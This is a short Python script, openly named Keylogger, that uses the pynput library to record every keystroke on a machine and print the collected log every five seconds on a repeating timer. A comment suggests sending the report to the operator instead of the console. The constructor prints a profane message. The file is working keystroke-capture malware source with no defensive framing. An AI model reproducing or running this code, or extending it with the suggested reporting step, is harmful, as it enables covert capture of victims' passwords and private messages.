import pynput.keyboard
import threading



class Keylogger:
    def __init__(self):
        self.log=""
        print("u are in the constructor and the truth is not i dont give a fuck")

    def append_to_log(self,string):
        self.log=self.log+string
    def process_key_press(self,key):

        current_key=" "

        try:
            current_key= str(key.char)
        except AttributeError:
            if key==key.space:
                current_key=" "
            else:
                current_key=" "+ str(key)+ " "
        self.append_to_log(current_key)

    def report(self):

        print(self.log) # sending report to yourself instead of printing  on the console
        self.log=""
        timer = threading.Timer(5,self.report)
        timer.start()

    def start(self):

        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()

my_keylogger =Keylogger()

my_keylogger.start()